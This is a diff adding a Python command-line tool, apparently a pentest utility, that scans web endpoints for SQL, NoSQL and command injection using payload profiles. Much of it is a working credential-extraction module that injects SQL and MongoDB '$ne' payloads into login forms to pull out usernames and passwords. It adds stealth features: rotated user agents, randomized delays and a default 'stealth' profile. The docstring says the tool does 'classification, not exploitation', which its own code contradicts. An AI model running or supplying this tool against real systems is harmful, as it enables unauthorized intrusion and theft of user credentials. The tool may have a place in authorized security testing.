@@ -1,0 +1,353 @@
+#!/usr/bin/env python3
+
+# ┌───────────────────────────────────────────────────────┐
+# │ Version        : 2026.02.17-01                        │
+# │ Author         : Mark Hamilton │ Co-Pilot AI assisted │
+# │ Script Purpose : Injection Scanner Engine             │
+# │ Package        : toolbox                              │
+# └───────────────────────────────────────────────────────┘
+
+"""
+Injection Scanner (is)
+Data-driven, low-noise engine for detecting injection vulnerabilities and,
+optionally, extracting credentials.
+
+- Payloads, modules, and signatures are loaded from JSON profiles.
+- Engine focuses on:
+  - minimal requests
+  - maximal response analysis
+  - classification, not exploitation
+"""
+
+import argparse
+import json
+import os
+import random
+import time
+import requests
+
+TOOL_NAME = "is"
+VERSION = "2026.02.17-01"
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DEFAULT_PROFILE = os.path.join(BASE_DIR, "profiles", "stealth.json")
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2) AppleWebKit/537.36",
+]
+
+# ─── HTTP Helper ───────────────────────────────────────────────────
+
+def make_request(url, method="GET", params=None, json_body=None):
+    headers = {"User-Agent": random.choice(USER_AGENTS)}
+    try:
+        if method.upper() == "GET":
+            return requests.get(url, params=params, headers=headers, timeout=10)
+        else:
+            return requests.post(url, json=json_body, headers=headers, timeout=10)
+    except Exception as e:
+        print(f"[ERROR] Request failed: {e}")
+        return None
+
+# ─── Profile Loader ────────────────────────────────────────────────
+
+def load_profile(profile_path=None):
+    if profile_path is None:
+        profile_path = DEFAULT_PROFILE
+
+    if not os.path.isabs(profile_path):
+        profile_path = os.path.join(BASE_DIR, "profiles", profile_path)
+
+    if not os.path.exists(profile_path):
+        print(f"[ERROR] Profile not found: {profile_path}")
+        raise SystemExit(1)
+
+    with open(profile_path, "r", encoding="utf-8") as f:
+        profile = json.load(f)
+
+    # Basic validation
+    if "payloads" not in profile or not isinstance(profile["payloads"], list):
+        print("[ERROR] Invalid profile: 'payloads' key missing or not a list")
+        raise SystemExit(1)
+
+    return profile
+
+# ─── Shared Helper for Creds Parsing ───────────────────────────────
+
+def extract_value(response_text):
+    """
+    Parses response to extract usernames or passwords.
+    This is intentionally simple and should be adapted per target.
+    """
+    if ":" in response_text:
+        return response_text.split(":", 1)[1].strip()
+    return None
+
+# ─── SQL Credential Extraction (embedded from sql_creds.py) ────────
+
+def sql_extract_credentials(target_url):
+    print("\n[+] Starting SQL credential extraction")
+    credentials = {}
+
+    for i in range(1, 50):
+        headers = {"User-Agent": random.choice(USER_AGENTS)}
+        payload = {"username": f"' OR LENGTH(username)={i} --", "password": "random"}
+        response = requests.post(target_url, json=payload, headers=headers)
+
+        time.sleep(random.uniform(1.5, 5))
+
+        if "Invalid password" in response.text:
+            new_user = extract_value(response.text)
+            if new_user and new_user not in credentials:
+                print(f"[+] Found username: {new_user}")
+                credentials[new_user] = sql_retrieve_password(target_url, new_user)
+            else:
+                break
+        else:
+            break
+
+    print("\n[+] Discovered SQL Credentials:")
+    for user, password in credentials.items():
+        print(f"    - {user}: {password}")
+
+def sql_retrieve_password(target_url, username):
+    discovered_passwords = []
+
+    for i in range(1, 50):
+        headers = {"User-Agent": random.choice(USER_AGENTS)}
+        payload = {"username": username, "password": f"' OR LENGTH(password)={i} --"}
+        response = requests.post(target_url, json=payload, headers=headers)
+
+        time.sleep(random.uniform(1.5, 5))
+
+        if "Invalid password" in response.text:
+            new_password = extract_value(response.text)
+            if new_password and new_password not in discovered_passwords:
+                print(f"[+] Found password for {username}: {new_password}")
+                discovered_passwords.append(new_password)
+            else:
+                break
+        else:
+            break
+
+    return discovered_passwords[-1] if discovered_passwords else "Not Found"
+
+# ─── NoSQL Credential Extraction (embedded from nosql-creds.py) ────
+
+def nosql_extract_credentials(target_url):
+    print("\n[+] Starting NoSQL credential extraction")
+    credentials = {}
+
+    while True:
+        headers = {"User-Agent": random.choice(USER_AGENTS)}
+        payload = {
+            "username": {"$ne": list(credentials.keys())},
+            "password": "random",
+        }
+        response = requests.post(target_url, json=payload, headers=headers)
+
+        time.sleep(random.uniform(1.5, 5))
+
+        if "Invalid password" in response.text:
+            new_user = extract_value(response.text)
+            if new_user and new_user not in credentials:
+                print(f"[+] Found username: {new_user}")
+                credentials[new_user] = nosql_retrieve_password(target_url, new_user)
+            else:
+                break
+        else:
+            break
+
+    print("\n[+] Discovered NoSQL Credentials:")
+    for user, password in credentials.items():
+        print(f"    - {user}: {password}")
+
+def nosql_retrieve_password(target_url, username):
+    discovered_passwords = []
+
+    while True:
+        headers = {"User-Agent": random.choice(USER_AGENTS)}
+        payload = {
+            "username": username,
+            "password": {"$ne": discovered_passwords},
+        }
+        response = requests.post(target_url, json=payload, headers=headers)
+
+        time.sleep(random.uniform(1.5, 5))
+
+        if "Invalid password" in response.text:
+            new_password = extract_value(response.text)
+            if new_password and new_password not in discovered_passwords:
+                print(f"[+] Found password for {username}: {new_password}")
+                discovered_passwords.append(new_password)
+            else:
+                break
+        else:
+            break
+
+    return discovered_passwords[-1] if discovered_passwords else "Not Found"
+
+# ─── Orchestrators for Creds ───────────────────────────────────────
+
+def run_auto_creds(url, db_type):
+    if not db_type:
+        print("\n[-] No DB type detected during scan; cannot auto-select creds module.")
+        return
+
+    if db_type == "sql":
+        sql_extract_credentials(url)
+    elif db_type == "nosql":
+        nosql_extract_credentials(url)
+    else:
+        print(f"[-] Unknown DB type: {db_type}")
+
+def run_creds_only(url, db_type):
+    if db_type == "sql":
+        sql_extract_credentials(url)
+    elif db_type == "nosql":
+        nosql_extract_credentials(url)
+    else:
+        print("[-] --creds-only requires --db-type sql|nosql")
+
+# ─── Data-Driven Unified Scanner ───────────────────────────────────
+
+def unified_scan(url, profile, param="id", method="GET", verbose=False):
+    """
+    Data-driven unified injection scan.
+    Profile structure:
+
+    {
+      "name": "stealth",
+      "description": "...",
+      "payloads": [
+        {
+          "payload": ";",
+          "modules": {
+            "DBI": [
+              ["SQL syntax", "SQL-based DB"],
+              ["MongoDB error", "MongoDB (NoSQL)"]
+            ],
+            "CMDI": [
+              ["command not found", "Command Injection"]
+            ]
+          }
+        },
+        ...
+      ]
+    }
+    """
+    print(f"[+] Running unified injection scan against: {url}")
+    print(f"[+] Profile: {profile.get('name', 'unnamed')} — {profile.get('description', '').strip()}")
+    print("[+] Minimal request strategy enabled")
+
+    findings = {}
+    db_type = None
+
+    for payload_entry in profile["payloads"]:
+        payload = payload_entry.get("payload")
+        modules = payload_entry.get("modules", {})
+
+        if verbose:
+            print(f"[LOG] Testing payload: {payload!r} against modules: {', '.join(modules.keys()) or 'none'}")
+
+        # Single request per payload
+        if method.upper() == "GET":
+            resp = make_request(url, "GET", params={param: payload})
+        else:
+            resp = make_request(url, "POST", json_body={param: payload})
+
+        if not resp:
+            continue
+
+        content = resp.text
+        lowered = content.lower()
+
+        # For each module, check signatures
+        for module_name, signatures in modules.items():
+            for sig in signatures:
+                if len(sig) < 2:
+                    continue
+                pattern, meaning = sig[0], sig[1]
+                if pattern.lower() in lowered:
+                    findings.setdefault(module_name, []).append((payload, pattern, meaning))
+
+                    # DBI classification hook
+                    if module_name.upper() == "DBI" and db_type is None:
+                        db_type = "nosql" if "nosql" in meaning.lower() else "sql"
+
+        time.sleep(random.uniform(0.5, 1.5))
+
+    # ─── Reporting ───────────────────────────────────────────────
+
+    print("\n────────── Scan Results ──────────")
+
+    if not findings:
+        print("[-] No injection signatures detected.")
+        return None
+
+    for module_name, hits in findings.items():
+        print(f"[+] {module_name} findings:")
+        for payload, pattern, meaning in hits:
+            print(f"    Payload: {payload!r}")
+            print(f"    Matched: {pattern!r}")
+            print(f"    Meaning: {meaning}")
+            print("    ─────────────────────")
+
+    if "DBI" in findings:
+        print(f"[+] DBI classification: {db_type.upper() if db_type else 'Unknown'}")
+
+    return db_type
+
+# ─── CLI / Main ───────────────────────────────────────────────────
+
+def build_parser():
+    parser = argparse.ArgumentParser(
+        prog=TOOL_NAME,
+        description=(
+            f"{TOOL_NAME} — Injection Scanner Engine\n"
+            f"Version: {VERSION}\n\n"
+            "Data-driven, low-noise injection detection with optional credential extraction.\n\n"
+            "Examples:\n"
+            "  is --url http://target/page.php?id=1\n"
+            "  is --url http://target/page.php?id=1 --profile full.json\n"
+            "  is --url http://target/login --auto-creds\n"
+            "  is --url http://target/login --creds-only --db-type sql\n"
+        ),
+        formatter_class=argparse.RawTextHelpFormatter,
+    )
+
+    parser.add_argument("--url", required=True, help="Target URL of the vulnerable endpoint")
+    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method for scanning (default: GET)")
+    parser.add_argument("--param", default="id", help="Parameter name to inject into (default: id)")
+    parser.add_argument("--profile", help="Profile filename or path (default: profiles/stealth.json)")
+    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging during scan")
+
+    parser.add_argument("--auto-creds", action="store_true", help="After scan, automatically run appropriate credential extractor if DBI is detected")
+    parser.add_argument("--creds-only", action="store_true", help="Run only credential extraction (no scan)")
+    parser.add_argument("--db-type", choices=["sql", "nosql"], help="Database type for --creds-only mode")
+
+    return parser
+
+def main():
+    parser = build_parser()
+    args = parser.parse_args()
+
+    print(f"{TOOL_NAME} — Injection Scanner Engine")
+    print(f"Version: {VERSION}")
+    print("────────────────────────────────────────")
+
+    if args.creds_only:
+        run_creds_only(args.url, args.db_type)
+        return
+
+    profile = load_profile(args.profile)
+    db_type = unified_scan(args.url, profile, param=args.param, method=args.method, verbose=args.verbose)
+
+    if args.auto_creds:
+        run_auto_creds(args.url, db_type)
+
+if __name__ == "__main__":
+    main()
